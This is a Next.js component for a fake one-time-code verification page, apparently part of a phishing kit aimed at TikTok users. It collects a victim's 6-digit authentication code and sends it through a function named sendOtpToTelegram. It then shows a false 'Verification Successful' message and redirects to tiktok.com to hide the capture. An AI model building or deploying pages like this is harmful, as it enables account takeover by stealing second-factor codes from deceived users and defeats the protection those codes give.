
"use client"

import { useState, useEffect } from "react"
import { zodResolver } from "@hookform/resolvers/zod"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { useRouter } from "next/navigation"

import { Button } from "@/components/ui/button"
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form"
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"
import { useToast } from "@/hooks/use-toast"
import { sendOtpToTelegram } from "@/app/actions/telegram"

const FormSchema = z.object({
  pin: z.string().min(6, {
    message: "Your one-time password must be 6 characters.",
  }),
})

export function OtpForm() {
  const { toast } = useToast()
  const router = useRouter()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showRedirectModal, setShowRedirectModal] = useState(false)
  const [redirectCountdown, setRedirectCountdown] = useState(10)
  const [otpTimer, setOtpTimer] = useState(60)

  useEffect(() => {
    const timer = setInterval(() => {
      setOtpTimer((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(timer)
  }, [])

  useEffect(() => {
    if (showRedirectModal) {
      const countdownTimer = setInterval(() => {
        setRedirectCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(countdownTimer)
            window.location.href = "https://www.tiktok.com/"
            return 0
          }
          return prev - 1
        })
      }, 1000)
      return () => clearInterval(countdownTimer)
    }
  }, [showRedirectModal])

  const form = useForm<z.infer<typeof FormSchema>>({
    resolver: zodResolver(FormSchema),
    defaultValues: {
      pin: "",
    },
  })

  async function onSubmit(data: z.infer<typeof FormSchema>) {
    setIsSubmitting(true)
    const result = await sendOtpToTelegram(data.pin)

    if (result.success) {
      toast({
        title: "Verification Successful",
        description: "Your code has been verified.",
      })
      setShowRedirectModal(true)
    } else {
      toast({
        title: "Verification Failed",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      })
    }
    setIsSubmitting(false)
  }

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`
  }

  return (
    <>
      <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
        <div className="text-center">
          <h1 className="text-2xl font-bold font-headline">Enter authentication code</h1>
          <p className="text-sm text-muted-foreground mt-2">
            Enter the 6-digit code sent to you. It will expire in{" "}
            <span className="font-bold text-primary">{formatTime(otpTimer)}</span>.
          </p>
        </div>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="w-full space-y-6 text-center">
            <FormField
              control={form.control}
              name="pin"
              render={({ field }) => (
                <FormItem className="flex flex-col items-center">
                  <FormControl>
                    <InputOTP maxLength={6} {...field} render={({ slots }) => (
                      <InputOTPGroup>
                        {slots.map((slot, index) => (
                          <InputOTPSlot key={index} {...slot} />
                        ))}
                      </InputOTPGroup>
                    )} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90" disabled={isSubmitting}>
              {isSubmitting ? "Verifying..." : "Verify"}
            </Button>
          </form>
        </Form>
      </div>

      <Dialog open={showRedirectModal} onOpenChange={setShowRedirectModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-xl">Verification Successful!</DialogTitle>
            <DialogDescription className="text-center pt-2">
              You will be redirected shortly.
            </DialogDescription>
          </DialogHeader>
          <div className="flex flex-col items-center justify-center p-6 space-y-4">
            <div className="text-6xl font-bold text-primary">{redirectCountdown}</div>
            <p className="text-muted-foreground">Redirecting to TikTok...</p>
          </div>
        </DialogContent>
      </Dialog>
    </>
  )
}
